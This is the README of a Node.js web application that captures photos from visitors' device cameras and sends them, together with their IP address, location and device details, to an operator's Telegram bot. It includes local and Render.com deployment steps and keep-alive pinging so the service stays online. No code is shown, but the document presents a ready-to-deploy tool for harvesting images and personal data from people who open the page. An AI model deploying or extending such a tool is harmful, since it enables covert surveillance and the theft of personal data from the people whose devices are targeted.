# Telegram Bot Camera Application

This application captures images from users' devices and sends them to a Telegram bot along with detailed information about the user.

## Features

- Camera capture with user permission
- Collects additional user data (IP, location, device info)
- Sends data to Telegram bot
- Keep-alive mechanisms to prevent service sleep

## Deployment Instructions

### Prerequisites

- Node.js installed
- A Telegram Bot (obtain BOT_TOKEN from BotFather)
- Render.com account (for hosting)

### Local Development

1. Clone this repository
2. Install dependencies:
   ```
   npm install
   ```
3. Configure your Telegram Bot token in `server.js` or as an environment variable
4. Start the server:
   ```
   node server.js
   ```
5. Open `http://localhost:3000` in your browser

### Deploying to Render

1. Sign up for a [Render.com](https://render.com/) account
2. Create a new Web Service
3. Connect to your GitHub repository OR use direct upload
4. Configure the service:
   - Name: Choose a name for your application
   - Runtime: Node.js
   - Build Command: `npm install`
   - Start Command: `node server.js`
   - Environment Variables:
     - BOT_TOKEN: Your Telegram Bot token
     - PORT: 10000 (or let Render choose)

## Preventing Service Sleep

Render's free tier services will "sleep" after 15 minutes of inactivity. This application includes multiple mechanisms to prevent this:

1. **Internal Self-Pinging**: The app pings itself every 5 minutes to stay awake
2. **External Monitoring**: Use the included `monitor.js` script on another service
3. **Endpoint Monitoring**: Use a third-party service to ping `/health` or `/ping` endpoints

### Setting up External Monitoring

1. Deploy your main application to Render
2. Configure another service to run `monitor.js`:
   - Set the SERVICE_URL environment variable to your deployed app URL
   - Run `node monitor.js`

## Security Note

Always secure your BOT_TOKEN. Do not expose it in client-side code or public repositories.

## Troubleshooting

- **Application Sleeping**: Check the service logs in Render for ping failures
- **No Images Being Sent**: Ensure your Telegram bot has been initialized by sending it a direct message
- **Errors**: Check the application logs for detailed error information

## License

This project is private and confidential.
